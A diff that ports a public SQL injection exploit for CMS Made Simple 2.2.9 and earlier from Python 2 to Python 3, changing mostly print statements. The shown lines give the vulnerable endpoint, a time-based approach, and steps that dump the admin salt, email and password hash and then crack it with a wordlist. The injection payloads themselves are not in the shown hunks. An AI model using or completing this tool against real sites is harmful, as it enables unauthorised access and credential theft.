@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
 # Date: 30-03-2019
 # Exploit Author: Daniele Scanu @ Certimeter Group
@@ -22,10 +22,10 @@ parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="C
 
 options, args = parser.parse_args()
 if not options.url:
-    print "[+] Specify an url target"
-    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
-    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
-    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
+    print("[+] Specify an url target")
+    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
+    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
+    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
     exit()
 
 url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
@@ -60,13 +60,13 @@ def crack_password():
 
 def beautify_print_try(value):
     global output
-    print "\033c"
+    print("\033c")
     cprint(output,'green', attrs=['bold'])
     cprint('[*] Try: ' + value, 'red', attrs=['bold'])
 
 def beautify_print():
     global output
-    print "\033c"
+    print("\033c")
     cprint(output,'green', attrs=['bold'])
 
 def dump_salt():
@@ -180,7 +180,7 @@ dump_email()
 dump_password()
 
 if options.cracking:
-    print(colored("[*] Now try to crack password"))
+    print("[*] Now try to crack password")
     crack_password()
 
 beautify_print()
